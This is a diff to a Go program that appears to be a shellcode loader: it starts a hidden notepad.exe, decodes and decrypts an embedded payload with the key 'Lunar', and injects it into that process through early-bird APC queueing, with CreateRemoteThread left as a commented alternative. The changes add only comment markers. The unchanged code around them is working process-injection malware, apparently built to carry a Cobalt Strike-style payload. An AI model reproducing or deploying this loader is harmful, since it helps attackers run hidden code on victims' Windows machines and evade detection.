@@ -60,17 +60,19 @@ func main() {
 		startupInfo.Cb = uint32(unsafe.Sizeof(startupInfo))
 		startupInfo.Flags |= windows.STARTF_USESHOWWINDOW
 		//startupInfo.ShowWindow = windows.SW_HIDE
+	        //----BREAK-------	
 		//creationFlags := windows.CREATE_SUSPENDED | windows.CREATE_NO_WINDOW | windows.EXTENDED_STARTUPINFO_PRESENT
 		//creationFlags := windows.CREATE_SUSPENDED | windows.EXTENDED_STARTUPINFO_PRESENT
 		creationFlags := windows.CREATE_NO_WINDOW | windows.EXTENDED_STARTUPINFO_PRESENT
 		//creationFlags := windows.EXTENDED_STARTUPINFO_PRESENT
+                //----BREAK-------	
 		programPath := "c:\\windows\\system32\\notepad.exe"
 		utfProgramPath, _ := windows.UTF16PtrFromString(programPath)
 		syscalls.CreateProcess(nil, utfProgramPath, nil, nil, true, uint32(creationFlags), nil, nil, &startupInfo, &procInfo)
 
 		// Decode shellcode
 		hex2str, _ := hex.DecodeString(shelly.Sc)
-		shellc := useful.Decrypt([]byte(hex2str), "Lunar")
+		shellc := useful.Decrypt([]byte(hex2str), "Lunar")//password/key
 		cspay, _ := hex.DecodeString(string(shellc))
 		decode, _ := b64.StdEncoding.DecodeString(string(cspay))
 
@@ -78,7 +80,7 @@ func main() {
 		injectinto := int(procInfo.ProcessId)
 
 		//Choose A Proc Injection Method//
-
+	        //----BREAK-------	
 		//CreateRemoteThread
 		//var Proc, R_Addr, F = useful.WriteShellcode(injectinto, decode)
 		//useful.ShellCodeCreateRemoteThread(Proc, R_Addr, F)
@@ -87,6 +89,7 @@ func main() {
 		var victimHandle = procInfo.Thread
 		var _, R_Addr, _ = useful.WriteShellcode(injectinto, decode)
 		useful.EBAPCQueue(R_Addr,victimHandle)
+		//----BREAK-------	
 	}
 
 }
